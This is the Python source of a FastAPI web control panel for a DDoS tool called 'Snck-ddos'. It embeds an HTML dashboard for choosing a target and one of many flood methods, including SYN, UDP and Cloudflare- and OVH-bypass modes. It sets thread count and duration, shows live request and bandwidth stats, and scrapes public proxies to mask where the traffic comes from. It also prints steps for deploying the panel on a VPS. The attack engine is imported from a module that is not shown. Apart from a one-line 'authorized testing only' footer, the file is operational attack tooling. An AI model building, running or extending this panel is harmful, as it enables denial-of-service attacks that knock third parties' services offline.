"""Snck-ddos panel — FastAPI :6767 — always serves HTML."""
from __future__ import annotations

import traceback
from pathlib import Path

from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field

ROOT = Path(__file__).resolve().parent.parent
STATIC = ROOT / "static"
TEMPLATE_DIR = ROOT / "web" / "templates"
TEMPLATE_FILE = TEMPLATE_DIR / "index.html"

app = FastAPI(title="Snck-ddos", docs_url=None, redoc_url=None)

try:
    STATIC.mkdir(parents=True, exist_ok=True)
    from fastapi.staticfiles import StaticFiles

    app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")
except Exception as e:
    print("[warn] static:", e)

_engine_err = None
try:
    from core.engine import engine, AttackConfig
    from core.proxy import scrape_proxies, check_batch, load_proxies, save_proxies
except Exception as e:
    engine = None  # type: ignore
    AttackConfig = None  # type: ignore
    _engine_err = f"{type(e).__name__}: {e}"
    print("[error] core:", _engine_err)
    traceback.print_exc()

PROXY_FILE = ROOT / "proxies.txt"
LIVE_PROXY_FILE = ROOT / "live_proxies.txt"

# Self-contained panel — never depends on Jinja path bugs
PANEL = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Snck-ddos</title>
<style>
:root{--bg:#0a0a0c;--panel:#121218;--border:#1e1e28;--red:#e11d48;--text:#e4e4e7;--muted:#71717a;--green:#22c55e}
*{box-sizing:border-box;margin:0;padding:0}body{font-family:ui-monospace,Menlo,monospace;background:var(--bg);color:var(--text);min-height:100vh;padding:20px}
.wrap{max-width:960px;margin:0 auto}header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-bottom:1px solid var(--border);padding-bottom:12px}
h1{color:var(--red);font-size:1.25rem;letter-spacing:.06em}h1 span{color:var(--muted);font-weight:400}
.pill{font-size:.75rem;padding:4px 12px;border-radius:999px;border:1px solid var(--border);color:var(--muted)}
.pill.live{border-color:var(--red);color:var(--red)}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}@media(max-width:720px){.grid{grid-template-columns:1fr}}
.panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px}
.panel h2{font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-bottom:10px}
label{display:block;font-size:.7rem;color:var(--muted);margin:8px 0 4px}
input,select{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:9px 11px;border-radius:6px;font-family:inherit;font-size:.85rem}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btns{display:flex;gap:8px;margin-top:14px}
button{flex:1;border:none;padding:11px;border-radius:6px;font-family:inherit;font-weight:600;cursor:pointer;font-size:.8rem}
.go{background:var(--red);color:#fff}.stop{background:transparent;border:1px solid var(--border);color:var(--muted)}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.stat{background:var(--bg);border-radius:8px;padding:12px;text-align:center}
.stat .v{font-size:1.15rem;font-weight:700}.stat .k{font-size:.65rem;color:var(--muted);margin-top:3px}.hl .v{color:var(--red)}
footer{margin-top:20px;text-align:center;font-size:.7rem;color:var(--muted)}
.err{color:var(--red);font-size:.75rem;margin-top:8px;min-height:1.2em}
</style></head><body><div class="wrap">
<header><h1>SNCK<span>-ddos</span></h1><div id="pill" class="pill">IDLE</div></header>
<div class="grid">
<div class="panel"><h2>Config</h2>
<label>Target</label><input id="target" placeholder="http://example.com or IP:port"/>
<div class="row"><div><label>Method</label>
<select id="method">
<option>GET</option><option>POST</option><option>HEAD</option><option>STRESS</option><option>SLOW</option>
<option>PPS</option><option>COOKIE</option><option>RHEX</option><option>DYN</option>
<option>CFB</option><option>OVH</option><option>BYPASS</option><option>GSB</option><option>XMLRPC</option>
<option>UDP</option><option>TCP</option><option>SYN</option><option>ACK</option><option>CPS</option>
<option>ICMP</option><option>VSE</option><option>MCBOT</option>
</select></div>
<div><label>Threads</label><input id="threads" type="number" value="300" min="1" max="5000"/></div></div>
<div class="row"><div><label>Duration (sec)</label><input id="duration" type="number" value="120" min="5"/></div>
<div><label>Payload</label><input id="payload" type="number" value="1200" min="64"/></div></div>
<label style="display:flex;gap:8px;align-items:center;cursor:pointer;margin-top:10px">
<input id="px" type="checkbox" checked style="width:auto"/> Proxies</label>
<div class="btns"><button class="go" id="btnGo">START</button><button class="stop" id="btnStop">STOP</button></div>
<div class="err" id="msg"></div>
</div>
<div class="panel"><h2>Stats</h2>
<div class="stats">
<div class="stat hl"><div class="v" id="rps">0</div><div class="k">RPS</div></div>
<div class="stat hl"><div class="v" id="mbps">0</div><div class="k">Mbps</div></div>
<div class="stat"><div class="v" id="reqs">0</div><div class="k">Reqs</div></div>
<div class="stat"><div class="v" id="w">0</div><div class="k">Workers</div></div>
<div class="stat"><div class="v" id="err">0</div><div class="k">Errors</div></div>
<div class="stat"><div class="v" id="up">0s</div><div class="k">Up</div></div>
</div>
<p style="margin-top:10px;font-size:.75rem;color:var(--muted)">Proxies: <b id="raw" style="color:var(--green)">0</b> / live <b id="live" style="color:var(--green)">0</b></p>
<button class="stop" style="width:100%;margin-top:10px;color:var(--text)" id="btnScrape">SCRAPE PROXIES</button>
</div></div>
<footer>Snck-ddos · :6767 · authorized testing only</footer></div>
<script>
const $ = id => document.getElementById(id);
async function poll(){
  try{
    const s = await (await fetch('/api/stats')).json();
    $('rps').textContent = s.rps || 0;
    $('mbps').textContent = s.mbps || 0;
    $('reqs').textContent = (s.requests || 0).toLocaleString();
    $('w').textContent = s.active_workers || 0;
    $('err').textContent = s.errors || 0;
    $('up').textContent = (s.uptime || 0) + 's';
    if (s.running) { $('pill').textContent = 'LIVE ' + (s.method||''); $('pill').classList.add('live'); }
    else { $('pill').textContent = 'IDLE'; $('pill').classList.remove('live'); }
    if (s.error) $('msg').textContent = s.error;
  } catch(e) { $('msg').textContent = 'API offline — is python main.py running?'; }
  try{
    const p = await (await fetch('/api/proxies')).json();
    $('raw').textContent = p.raw || 0; $('live').textContent = p.live || 0;
  } catch(e) {}
}
setInterval(poll, 800); poll();
$('btnGo').onclick = async () => {
  $('msg').textContent = '';
  const body = {
    target: $('target').value.trim(),
    method: $('method').value,
    threads: +$('threads').value || 200,
    duration: +$('duration').value || 60,
    payload_size: +$('payload').value || 1024,
    use_proxies: $('px').checked
  };
  if (!body.target) { $('msg').textContent = 'set a target'; return; }
  try {
    const j = await (await fetch('/api/start', {
      method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body)
    })).json();
    if (!j.ok) $('msg').textContent = j.error || 'start failed';
    else $('msg').textContent = 'started' + (j.proxies ? ' ('+j.proxies+' proxies)' : '');
  } catch(e) { $('msg').textContent = 'start request failed'; }
};
$('btnStop').onclick = async () => { try { await fetch('/api/stop', {method:'POST'}); } catch(e) {} };
$('btnScrape').onclick = async () => {
  try { await fetch('/api/scrape', {method:'POST'}); $('msg').textContent = 'scrape started'; }
  catch(e) { $('msg').textContent = 'scrape failed'; }
};
</script></body></html>"""


class StartBody(BaseModel):
    target: str = Field(..., min_length=4)
    method: str = "GET"
    threads: int = Field(200, ge=1, le=5000)
    duration: int = Field(60, ge=5, le=86400)
    payload_size: int = Field(1024, ge=64, le=65535)
    use_proxies: bool = True


@app.get("/health")
async def health():
    return {
        "ok": True,
        "port": 6767,
        "engine": _engine_err is None,
        "engine_error": _engine_err,
    }


@app.get("/", response_class=HTMLResponse)
async def index(_request: Request):
    # Always return embedded panel — avoids Jinja/Starlette TemplateResponse bugs
    return HTMLResponse(PANEL)


@app.get("/api/stats")
async def stats():
    if engine is None:
        return {
            "running": False,
            "requests": 0,
            "rps": 0,
            "mbps": 0,
            "errors": 0,
            "active_workers": 0,
            "uptime": 0,
            "method": "",
            "target": "",
            "error": _engine_err,
        }
    s = engine.stats
    return {
        "running": s.running,
        "method": s.method,
        "target": s.target,
        "threads": s.threads,
        "requests": s.requests,
        "bytes_sent": s.bytes_sent,
        "errors": s.errors,
        "active_workers": s.active_workers,
        "rps": round(s.rps(), 1),
        "mbps": round(s.mbps(), 2),
        "uptime": round(
            max(0, __import__("time").time() - s.started), 1
        )
        if (s.running or s.requests)
        else 0,
    }


@app.post("/api/start")
async def start_attack(body: StartBody, bg: BackgroundTasks):
    if engine is None or AttackConfig is None:
        return JSONResponse(
            {"ok": False, "error": _engine_err or "engine not loaded"}, status_code=500
        )
    if engine.stats.running:
        return JSONResponse(
            {"ok": False, "error": "already running"}, status_code=400
        )

    proxies: list[str] = []
    if body.use_proxies:
        try:
            proxies = load_proxies(LIVE_PROXY_FILE) or load_proxies(PROXY_FILE)
        except Exception:
            proxies = []

    target = body.target.strip()
    l4 = {"UDP", "TCP", "SYN", "ACK", "CPS", "ICMP", "VSE", "MCBOT"}
    if not target.startswith(("http://", "https://")) and body.method.upper() not in l4:
        target = "http://" + target

    cfg = AttackConfig(
        target=target,
        method=body.method.upper(),
        threads=body.threads,
        duration=body.duration,
        payload_size=body.payload_size,
        proxies=[f"http://{p}" for p in proxies] if proxies else [],
    )

    async def _run() -> None:
        try:
            await engine.start(cfg)
        except Exception as e:
            print("[error] attack:", e)
            traceback.print_exc()

    bg.add_task(_run)
    return {"ok": True, "proxies": len(proxies)}


@app.post("/api/stop")
async def stop_attack():
    if engine is None:
        return {"ok": False, "error": "engine not loaded"}
    try:
        await engine.stop()
    except Exception as e:
        return {"ok": False, "error": str(e)}
    return {"ok": True}


@app.post("/api/scrape")
async def api_scrape(bg: BackgroundTasks):
    if _engine_err:
        return JSONResponse(
            {"ok": False, "error": "proxy module not loaded"}, status_code=500
        )

    async def job() -> None:
        try:
            raw = await scrape_proxies()
            save_proxies(raw, PROXY_FILE)
            live = await check_batch(raw, concurrency=400)
            save_proxies(live, LIVE_PROXY_FILE)
        except Exception as e:
            print("[error] scrape:", e)

    bg.add_task(job)
    return {"ok": True}


@app.get("/api/proxies")
async def api_proxies():
    try:
        return {
            "raw": len(load_proxies(PROXY_FILE)),
            "live": len(load_proxies(LIVE_PROXY_FILE)),
        }
    except Exception:
        return {"raw": 0, "live": 0}


def run(host: str = "0.0.0.0", port: int = 6767) -> None:
    import uvicorn

    print(f"[*] binding http://{host}:{port}")
    print(f"[*] open   http://YOUR_VPS_IP:{port}")
    print(f"[*] health http://YOUR_VPS_IP:{port}/health")
    print(f"[*] firewall: allow TCP {port}")
    uvicorn.run(app, host=host, port=port, log_level="info", workers=1)


if __name__ == "__main__":
    run()
